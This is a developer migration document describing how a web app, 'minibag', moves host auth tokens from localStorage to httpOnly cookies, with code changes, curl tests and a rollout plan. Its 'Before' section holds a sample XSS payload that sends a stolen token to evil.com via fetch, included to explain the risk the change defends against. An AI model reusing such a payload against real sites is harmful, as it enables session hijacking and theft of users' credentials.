# HttpOnly Cookies Migration - Host Token Security

**Status:** ✅ Implemented
**Priority:** HIGH (Critical Security Fix)
**Date:** 2025-11-02
**Security Impact:** Prevents XSS token theft

---

## Overview

Migrated host authentication from localStorage to httpOnly cookies to prevent XSS attacks from stealing authentication tokens.

## Security Improvement

### Before (Vulnerable to XSS)
```javascript
// ❌ INSECURE: Token accessible via JavaScript
localStorage.setItem('host_token_abc123', token);
const token = localStorage.getItem('host_token_abc123');

// Any XSS attack can steal the token:
// <script>
//   fetch('https://evil.com/steal?token=' + localStorage.getItem('host_token_abc123'))
// </script>
```

### After (XSS Protected)
```javascript
// ✅ SECURE: Token in httpOnly cookie
// Server sets: Set-Cookie: minibag_host_token=...; HttpOnly; Secure; SameSite=Strict
// JavaScript CANNOT access this cookie
// Browser automatically sends cookie with requests
```

---

## Changes Made

### 1. Backend Changes

#### a) Cookie Parser Middleware (`packages/shared/server.js`)
```javascript
import cookieParser from 'cookie-parser';

app.use(cookieParser()); // Added after express.json()
```

#### b) Cookie Utility Module (`packages/shared/utils/cookies.js`)
**New file** with utilities:
- `setHostTokenCookie(res, token, sessionId)` - Set httpOnly cookie
- `getHostToken(req)` - Read from cookie or headers (backward compatible)
- `clearHostTokenCookie(res)` - Clear cookie on logout
- `getCookieOptions()` - Consistent cookie configuration

**Cookie Configuration:**
```javascript
{
  httpOnly: true,           // Cannot be accessed via JavaScript
  secure: isProduction,     // HTTPS only in production
  sameSite: 'strict',       // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
  path: '/'                 // Available across all routes
}
```

#### c) Updated Session Creation (`packages/shared/api/sessions.js`)
```javascript
// OLD: Return token in response body
res.json({
  host_token: host_token  // ❌ Vulnerable
});

// NEW: Set as httpOnly cookie
setHostTokenCookie(res, host_token, session.id);
res.json({
  auth_method: 'cookie'  // ✅ Secure
});
```

#### d) Updated Authentication (`packages/shared/api/sessions.js`)
```javascript
// OLD: Read from header only
const host_token = req.headers['x-host-token'];

// NEW: Read from cookie (with backward compatibility)
const host_token = getHostToken(req);  // Checks cookie first, then headers
```

### 2. Frontend Changes

#### a) Updated API Service (`packages/minibag/src/services/api.js`)
```javascript
// Added credentials to send cookies
const defaultOptions = {
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include'  // ✅ Send cookies with every request
};
```

#### b) Removed localStorage Token Storage (`packages/minibag/src/hooks/useSession.js`)
```javascript
// OLD: Store token in localStorage
localStorage.setItem(`host_token_${sessionId}`, hostToken);  // ❌ Removed

// NEW: Cookie set automatically by server
// No client-side storage needed
```

#### c) Removed Token Header Sending (`packages/minibag/src/services/api.js`)
```javascript
// OLD: Manually send token in header
headers: {
  'X-Host-Token': localStorage.getItem(`host_token_${sessionId}`)  // ❌ Removed
}

// NEW: Cookie sent automatically
// credentials: 'include' handles everything
```

---

## Backward Compatibility

The implementation maintains backward compatibility during migration:

```javascript
export function getHostToken(req) {
  // Priority 1: httpOnly cookie (NEW secure method)
  if (req.cookies && req.cookies['minibag_host_token']) {
    return req.cookies['minibag_host_token'];
  }

  // Priority 2: Authorization header (backward compatibility)
  const authHeader = req.headers.authorization;
  if (authHeader && authHeader.startsWith('Bearer ')) {
    return authHeader.substring(7);
  }

  // Priority 3: X-Host-Token header (backward compatibility)
  if (req.headers['x-host-token']) {
    return req.headers['x-host-token'];
  }

  return null;
}
```

This allows:
- Old clients (with localStorage) to continue working
- New clients (with cookies) to work immediately
- Gradual migration without breaking existing sessions

---

## Testing

### Manual Testing

**Test 1: Create session and verify cookie set**
```bash
curl -X POST http://localhost:3000/api/sessions/create \
  -H "Content-Type: application/json" \
  -c cookies.txt \  # Save cookies
  -d '{
    "location_text": "Test Market",
    "scheduled_time": "2025-11-03T10:00:00Z",
    "selected_nickname": "TestHost",
    "selected_avatar_emoji": "👨"
  }'

# Check cookies.txt - should contain minibag_host_token
cat cookies.txt
```

**Test 2: Update session status using cookie**
```bash
curl -X PUT http://localhost:3000/api/sessions/abc12345/status \
  -H "Content-Type: application/json" \
  -b cookies.txt \  # Send cookies
  -d '{"status": "active"}'

# Expected: 200 OK (authenticated via cookie)
```

**Test 3: Verify cookie security flags**
```bash
# In browser DevTools:
# 1. Open Application > Cookies
# 2. Find minibag_host_token
# 3. Verify:
#    - HttpOnly: ✓ (checked)
#    - Secure: ✓ (in production)
#    - SameSite: Strict
#    - Path: /
#    - Max-Age: 604800 (7 days)
```

**Test 4: Verify JavaScript cannot access cookie**
```javascript
// In browser console:
document.cookie  // Should NOT show minibag_host_token
// This is the whole point - XSS cannot steal it!
```

**Test 5: Backward compatibility with header**
```bash
# Old clients can still use X-Host-Token header
curl -X PUT http://localhost:3000/api/sessions/abc12345/status \
  -H "Content-Type: application/json" \
  -H "X-Host-Token: <token-from-old-client>" \
  -d '{"status": "active"}'

# Expected: 200 OK (backward compatible)
```

### Browser Testing Checklist

- [ ] Create session in Chrome - verify cookie set
- [ ] Reload page - verify cookie persists
- [ ] Update session status - verify authenticated
- [ ] Open DevTools - verify cookie has HttpOnly flag
- [ ] Try to access cookie via JavaScript - verify fails
- [ ] Test in private/incognito - verify cookie works
- [ ] Test logout - verify cookie cleared

---

## Security Benefits

### 1. XSS Protection ✅
**Before:** XSS could steal token via `localStorage.getItem()`
**After:** httpOnly cookies cannot be accessed by JavaScript

### 2. CSRF Protection ✅
**SameSite=Strict:** Cookie only sent with same-origin requests

### 3. Secure Transport ✅
**Secure flag:** Cookie only sent over HTTPS in production

### 4. Automatic Management ✅
**Browser-managed:** No manual token handling, less error-prone

---

## Migration Strategy

### Phase 1: Dual Support (Current)
- Backend accepts both cookies AND headers
- Frontend updated to use cookies
- Old clients continue working with headers

### Phase 2: Cookie Preferred (Future)
- Log warnings for header-based authentication
- Encourage clients to upgrade

### Phase 3: Cookie Only (Future - After Grace Period)
- Remove header-based authentication
- All clients must use cookies

---

## Configuration

### Environment Variables
No new environment variables required. Cookie behavior determined by:
- `NODE_ENV`: If 'production', sets `secure: true`
- CORS already configured with `credentials: true`

### Cookie Names
Defined in `packages/shared/utils/cookies.js`:
```javascript
export const COOKIE_NAMES = {
  HOST_TOKEN: 'minibag_host_token',  // Authentication
  SESSION_ID: 'minibag_session_id'   // Convenience (not httpOnly)
};
```

---

## Troubleshooting

### Issue: Cookie not being set

**Check:**
1. CORS configured with `credentials: true` ✓ (already done)
2. Frontend sending `credentials: 'include'` ✓ (already done)
3. Same origin or proper CORS headers

**Debug:**
```bash
# Check response headers
curl -v http://localhost:3000/api/sessions/create ... | grep Set-Cookie
```

### Issue: Cookie not being sent

**Check:**
1. `credentials: 'include'` in fetch options ✓
2. Cookie not expired (7 days)
3. Path matches (`/`)
4. Same origin or CORS allows credentials

**Debug:**
```javascript
// In browser console
fetch('/api/sessions/abc123/status', {
  method: 'PUT',
  credentials: 'include',  // CRITICAL
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ status: 'active' })
})
```

### Issue: 401 Unauthorized after migration

**Possible causes:**
1. Old localStorage tokens not cleaned up (harmless, will expire)
2. Cookie expired (7 day max age)
3. Different subdomain (cookies are origin-specific)

**Solution:**
- Have user create new session
- Cookie will be set properly

---

## Future Enhancements

### 1. Refresh Tokens
- Short-lived access tokens (1 hour)
- Long-lived refresh tokens (30 days)
- Automatic token refresh

### 2. Session Management API
```javascript
// Logout endpoint to clear cookie
POST /api/auth/logout
```

### 3. Multi-Device Support
- Track sessions per device
- Revoke specific device sessions
- "Log out all devices" feature

### 4. Security Headers
- Implement additional headers:
  - `Strict-Transport-Security`
  - `X-Content-Type-Options`
  - `X-Frame-Options`

---

## Files Modified

### Backend
- ✅ `packages/shared/package.json` - Added cookie-parser
- ✅ `packages/shared/server.js` - Added cookieParser middleware
- ✅ `packages/shared/utils/cookies.js` - New cookie utility module
- ✅ `packages/shared/api/sessions.js` - Updated to use cookies
- 📝 `packages/shared/CHANGELOG.md` - Document changes

### Frontend
- ✅ `packages/minibag/src/services/api.js` - Added credentials: 'include'
- ✅ `packages/minibag/src/hooks/useSession.js` - Removed localStorage tokens
- 📝 `packages/minibag/CHANGELOG.md` - Document changes

### Documentation
- ✅ This file (`docs/HTTPONLY_COOKIES_MIGRATION.md`)
- 📝 `docs/SECURITY.md` - Update security practices
- 📝 `README.md` - Update authentication section

---

## References

**Security Resources:**
- [OWASP: HttpOnly Cookie Attribute](https://owasp.org/www-community/HttpOnly)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [MDN: Fetch API - credentials](https://developer.mozilla.org/en-US/docs/Web/API/fetch#credentials)

**Implementation Details:**
- Backend: `packages/shared/utils/cookies.js`
- Frontend: `packages/minibag/src/services/api.js`
- Session Management: `packages/minibag/src/hooks/useSession.js`

---

**Status:** ✅ Complete
**Security Rating:** **HIGH** (Major XSS vulnerability fixed)
**Backward Compatible:** ✅ Yes (accepts both cookies and headers)
**Testing Required:** Yes (manual and automated)

**Next Steps:**
1. Test thoroughly in development
2. Deploy to staging
3. Monitor for issues
4. Deploy to production
5. Gradual migration of existing users
